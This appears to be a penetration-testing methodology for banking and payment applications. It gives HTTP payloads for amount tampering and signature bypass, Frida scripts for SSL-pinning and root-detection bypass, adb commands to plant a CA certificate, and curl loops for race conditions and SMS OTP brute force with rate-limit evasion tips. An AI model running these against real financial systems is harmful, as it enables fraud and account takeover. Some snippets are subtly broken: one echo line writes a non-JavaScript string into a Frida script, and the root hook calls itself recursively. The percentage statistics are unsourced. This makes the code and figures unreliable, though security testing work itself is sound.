# Banking & Finance Industry Security Testing

Specialized security testing methodology for banking and finance applications. Includes attack surface mapping, vulnerability patterns, and detection strategies based on real-world penetration testing data.

---

## Industry Overview

### Source Data Statistics

| Metric | Value | Notes |
|--------|-------|-------|
| Payment amount tampering | 83% | Most common fintech vuln |
| Payment bypass ratio | 68.7% | Signature/verification bypass |
| Password reset bypass | 88% | OTP/step-skip vulnerabilities |
| Race condition success | 45% | On concurrent payment flows |
| Mobile API vulnerabilities | 52% | Insecure endpoints |
| Business logic flaws | 73% | In complex financial workflows |

---

## Attack Surface (3-Layer Model)

### Layer 1: Public Facing (Directly Accessible)

```yaml
web:
  - Main website / portal
  - Internet banking login
  - Credit card application forms
  - Loan application portals
  - Customer support portals
  - Fund transfer interfaces
  - API gateways
  - Mobile app download portals

mobile:
  - Android APK
  - iOS IPA
  - Mobile banking apps
  - Payment apps
  - Investment/trading apps
  - Wallet apps

apis:
  - REST API endpoints
  - GraphQL endpoints
  - SOAP/XML services
  - WebSocket feeds
  - Third-party integration APIs
```

### Layer 2: Business Logic (Transaction Flows)

```yaml
authentication:
  - Login / registration
  - Password reset flows
  - Multi-factor authentication
  - Biometric verification
  - PIN management

transactions:
  - Fund transfers (same bank)
  - Inter-bank transfers
  - International wire transfers
  - Bill payments
  - Card-to-card transfers
  - Mobile top-ups
  - Merchant payments

account_management:
  - Profile updates
  - Beneficiary management
  - Card management
  - Statement access
  - Limit management
```

### Layer 3: Backend Infrastructure

```yaml
infrastructure:
  - Core banking systems
  - Payment switches
  - Settlement systems
  - Reconciliation engines
  - SMS gateways
  - Email systems
  - Database clusters
  - Load balancers
```

---

## Common Vulnerability Patterns

### Payment Tampering

Amount manipulation is the most critical category (83% of fintech findings):

```http
-- Modify amount via parameter tampering
POST /api/transfer HTTP/1.1
{"amount": 0.01, "to_account": "attacker"}

-- Negative amount (reverse transfer)
POST /api/payment HTTP/1.1
{"amount": -1000, "currency": "USD"}

-- Quantity manipulation
POST /api/purchase HTTP/1.1
{"product_id": 123, "quantity": -5, "price": 1000}

-- Fraction manipulation
POST /api/transfer HTTP/1.1
{"amount": 0.001, "currency": "BTC"}
```

#### notify_url Replay

```http
-- Payment callback replay
POST /payment/notify HTTP/1.1
{"order_id": "ORD12345", "status": "success", "amount": 1000.00}

-- Replay the same notification multiple times
# Check if idempotency key exists
# Check if server validates order was already completed

-- Missing signature verification
# Many payment integrations skip signature check on notify_url
```

#### Signature Validation Flaws

```http
-- No signature required
POST /api/payment
{"amount": 1000, "to": "attacker"}  # no signature field

-- Signature not verified
POST /api/payment
{"amount": 1000, "to": "attacker", "sign": "any_value"}

-- Signature reused across amounts
# Capture valid sig for $1, reuse with $1000000

-- MD5/weak hash signature bypass (parameter manipulation)
POST /api/payment
{"amount": 1000, "sign": "MD5(amount=1000&secret=..."}
# Try parameter injection: &amount=0.01
```

#### Currency Conversion Flaws

```http
-- Currency mismatch exploitation
POST /api/exchange
{"from": "USD", "to": "BTC", "amount": 1.00}
# Check if they convert at favorable rates while quoting different

-- Rounding exploitation
# Try amounts like 0.001, 0.0001 to exploit rounding errors
# Check if rounding always favors the institution
```

### Mobile App Bypass

#### Frida / Objection Hooks (52% of apps have bypassable security)

```javascript
// SSL Pinning Bypass - Android
Java.perform(function() {
    var arraylist = Java.use("java.util.ArrayList");
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    var TrustAllManager = Java.registerClass({
        name: "com.example.TrustAllManager",
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var trustAllManager = TrustAllManager.$new();
    var sc = SSLContext.getInstance("TLS");
    sc.init(null, [trustAllManager], null);
    SSLContext.setDefault(sc);
});

// Root detection bypass - Android
Java.perform(function() {
    // Bypass common root checks
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        // java.io.File.exists() is zero-argument — use this.getPath()
        var path = this.getPath();
        var blocked = ["/system/bin/su", "/system/xbin/su",
                       "/sbin/su", "/system/app/Superuser.apk"];
        if (blocked.indexOf(path) >= 0) return false;
        return this.exists(path);
    };
});

// iOS SSL Pinning Bypass
// objection --gadget com.example.app
// ios sslpinning disable

// iOS Jailbreak Detection Bypass
// objection --gadget com.example.app
// ios jailbreak disable
```

#### Certificate Pinning Bypass Tools

```bash
# Android
adb shell
echo "set objc.app.SSLPinningEnabled = false" > /tmp/frida_script.js
frida -U -l frida_script.js com.example.app

# iOS (non-jailbroken)
# Use objection
objection --gadget com.example.app explore
ios sslpinning disable

# Burp Suite + Android Emulator
# Install CA in system trust store (requires rooted emulator)
adb push burpca.der /sdcard/
adb shell
su
mount -o remount,rw /system
cp /sdcard/burpca.der /system/etc/security/cacerts/9a5ba575.0
chmod 644 /system/etc/security/cacerts/9a5ba575.0
reboot
```

### Race Conditions (45% success rate)

```bash
# Concurrent redemption testing
for i in {1..50}; do
  curl -s -X POST http://target/api/redeem \
    -d "coupon=DISCOUNT50&user=test$i" \
    -H "Cookie: session=..." &
done
wait

# Concurrent fund transfer
for i in {1..20}; do
  curl -s -X POST http://target/api/transfer \
    -d "amount=1000&from=checking&to=savings" &
done
wait

# Concurrent withdrawal
# Test if balance check and deduction are atomic
# Send 10 withdrawal requests simultaneously via Burp Intruder
```

### SMS / CAPTCHA Brute Force

```bash
# SMS OTP brute force (4-6 digit codes)
for code in $(seq -w 0000 9999); do
  resp=$(curl -s -X POST http://target/api/verify \
    -d "phone=1xxxxxxxxx&code=$code")
  if [[ "$resp" != *"invalid"* ]]; then
    echo "Found code: $code"
    break
  fi
done

# Rate limit bypass techniques
# 1. IP rotation via X-Forwarded-For
# 2. Different endpoints (verify_otp, check_code, etc.)
# 3. Different request parameters order
# 4. Session-based rate limiting (create new session each time)
# 5. Use different User-Agent headers
```

### Face Recognition / Liveness Bypass

```yaml
techniques:
  - "Photo replay (static image)"
  - "Video replay (recorded video)"
  - "3D mask attack"
  - "Deepfake / face swap"
  - "Server-side bypass via API manipulation"
  
api_bypass:
  - "Modify response from 'liveness_check_failed' to 'liveness_check_passed'"
  - "Skip liveness check endpoint entirely"
  - "Replay old successful liveness token"
  - "Register with low-quality image that bypasses check"
```

### Transaction Signing Bypass

```http
-- Check if transaction signing is required
POST /api/transfer
{"amount": 100, "to": "attractor"}  # no signing

-- SMS signing bypass via SS7 / SIM swap
# If signing relies on SMS, SIM swap can bypass

-- Hardware token bypass
# Check if token code can be reused
# Check if token has time window (older codes work)
# Check if token validation is server-side
```

---

## Banking API Testing Flow

```yaml
reconnaissance:
  - "Map all API endpoints (swagger, api-docs, GraphQL introspection)"
  - "Identify authentication method (OAuth2, JWT, API keys)"
  - "Catalog all financial operations (transfer, payment, withdrawal)"
  - "Document request/response formats"

functional_testing:
  - "Normal flow: complete valid transaction"
  - "Negative amounts: -100, -0.01"
  - "Zero amounts: 0.00"
  - "Maximum values: 999999999.99"
  - "Float precision: 0.1, 0.01, 0.001, 0.0001"
  - "Currency codes: invalid, uppercase, lowercase"
  - "Account numbers: non-existent, closed, frozen"
  - "Reference IDs: reuse across transactions"

logic_testing:
  - "Skip steps in multi-step flows"
  - "Change order of operations"
  - "Replay requests (duplicate detection)"
  - "Race conditions (concurrent operations)"
  - "State tampering (change status in response to success)"

auth_testing:
  - "IDOR on account numbers"
  - "IDOR on transaction history"
  - "IDOR on beneficiary lists"
  - "Token reuse across sessions"
  - "Privilege escalation (regular user -> admin functions)"
```

### Financial-Specific Endpoints

```http
-- High-risk endpoints to test
POST /api/transfer
POST /api/withdraw
POST /api/deposit
POST /api/payment
POST /api/refund
POST /api/charge
POST /api/redeem
POST /api/exchange
POST /api/convert
POST /api/settlement
POST /api/reconciliation
POST /api/notify
POST /api/callback
POST /api/webhook
```

### Financial Fraud Detection Weaknesses

```yaml
common_weaknesses:
  - "No velocity check on transactions"
  - "Same IP, different accounts - no flag"
  - "New device, large transaction - no flag"
  - "Geographic anomaly - no flag"
  - "Time anomaly (3 AM large transfer) - no flag"
  - "Amount anomaly (first transfer is max) - no flag"
```

---

## Bank-Specific Testing Methodology

### Internet Banking

```yaml
test_areas:
  login:
    - "Credential stuffing on login"
    - "2FA bypass via response manipulation"
    - "Session fixation"
    - "Remember me token forgery"
    - "CAPTCHA bypass/reuse"

  transfers:
    - "Amount tampering (all transfer types)"
    - "Beneficiary manipulation"
    - "Date manipulation (future/scheduled transfers)"
    - "Currency manipulation"
    - "Fee manipulation (reduce/circumvent fees)"

  profile:
    - "IDOR on other users' profiles"
    - "Email/phone change without verification"
    - "Limit changes without proper auth"
    - "Beneficiary list manipulation"
```

### Mobile Banking

```yaml
test_areas:
  client_side:
    - "Binary protection analysis"
    - "Root/jailbreak detection bypass"
    - "SSL pinning bypass"
    - "Code obfuscation analysis"
    - "Local storage inspection"
    - "Log analysis (sensitive data in logs)"
    - "Backup analysis (sensitive data in backups)"

  api:
    - "All internet banking tests apply"
    - "Additional mobile-specific API endpoints"
    - "Device fingerprint manipulation"
    - "Location spoofing"
    - "Biometric bypass"
```

### Payment Gateway

```yaml
test_areas:
  integration:
    - "Signature verification bypass"
    - "notify_url / callback manipulation"
    - "Order information tampering"
    - "Refund amount manipulation"
    - "Duplicate payment notification"
    - "Payment status manipulation"
    - "Currency conversion manipulation"

  webhook:
    - "Webhook secret brute force"
    - "Webhook replay attack"
    - "Webhook endpoint injection"
```

---

## Recommended Tooling

```bash
# Mobile testing
frida                       # Dynamic instrumentation
objection                   # Mobile exploration
apktool                     # APK decompilation
jadx                        # Java decompiler
Mobile Security Framework   # Automated mobile analysis

# API testing
Burp Suite Pro              # Interception proxy
Postman / Insomnia          # API client
mitmproxy                   # CLI proxy
OWASP ZAP                   # Automated scanner

# Race condition testing
Burp Turbo Intruder
custom race.py (Python async IO)

# Automation
python3 -m pip install httpx aiohttp requests
```
